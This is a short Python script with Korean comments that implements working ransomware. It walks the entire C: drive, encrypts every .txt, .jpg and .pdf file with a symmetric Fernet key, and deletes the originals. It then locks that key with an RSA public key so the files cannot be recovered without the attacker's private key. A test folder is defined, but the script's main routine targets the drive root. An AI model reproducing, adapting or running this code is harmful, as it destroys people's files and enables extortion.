from cryptography.fernet import Fernet          # 대칭키 암호화
from Cryptodome.PublicKey import RSA            # public key, private key
from Cryptodome.Cipher import PKCS1_OAEP        # 비대칭키 암호화
import os                                       # 파일탐색



class ransom:
    # class method
    file_ext = ['txt', 'jpg', 'pdf']                        # 파일 확장자
    def __init__(self):
        self.key = None                                     # 대칭키
        self.publickey = None                               # 공개키
        self.crypter = None                                 # Fernet 객체
        self.rootpath = 'c:/'                               # C 경로
        self.testpath = r'C:\Users\ksh\Desktop\ransomtest'  # 테스트 경로

    # 대칭 key 생성
    def gernerate_symmetric_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    # 파일 암호화
    def execute(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
                enc_data = self.crypter.encrypt(data)

            enc_filepath = filepath+'.abc'
            with open(enc_filepath, 'wb') as f:
                f.write(enc_data)
            print("Encrypt : ", enc_filepath)
            os.remove(filepath)

        except PermissionError:
            pass
        except FileNotFoundError:
            pass

    # 파일 탐색
    def searchfile(self):
        for path, dir, files in os.walk(self.rootpath):
            for file in files:
                filepath = os.path.join(path, file)
                if file.split('.')[-1] in self.file_ext:
                    self.execute(filepath)

    # 대칭 key 암호화
    def enc_key(self):
        if not os.path.isdir('c:/ransom'):
            os.makedirs('c:/ransom')

        with open('C:/ransom/fernet_key.txt', 'wb') as wf:
            self.publickey = RSA.import_key(open('C:/key/public.pem').read())
            public_crpyter = PKCS1_OAEP.new(self.publickey)
            enc_fernet_key = public_crpyter.encrypt(self.key)
            wf.write(enc_fernet_key)



if __name__ == '__main__':
    ran = ransom()

    ran.gernerate_symmetric_key()     # 대칭 key 생성
    ran.searchfile()                  # 파일탐색, 파일 암호화
    ran.enc_key()                     # 대칭 key 암호화

    print("Encrypt complete")